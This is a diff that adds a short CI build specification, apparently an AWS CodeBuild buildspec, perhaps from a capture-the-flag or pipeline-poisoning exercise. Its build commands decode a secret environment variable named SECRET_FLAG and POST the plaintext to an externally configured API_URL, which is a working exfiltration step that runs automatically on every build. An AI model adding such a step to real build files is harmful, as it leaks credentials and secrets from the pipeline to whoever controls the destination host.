@@ -1,0 +1,7 @@
+version: 0.2
+phases: 
+  build:
+    commands:
+    - secret=$(echo $SECRET_FLAG | base64 -d)
+    - >
+      curl $API_URL/hello -XPOST -H "Content-Type: text/html" -d"superSecretData=$secret"
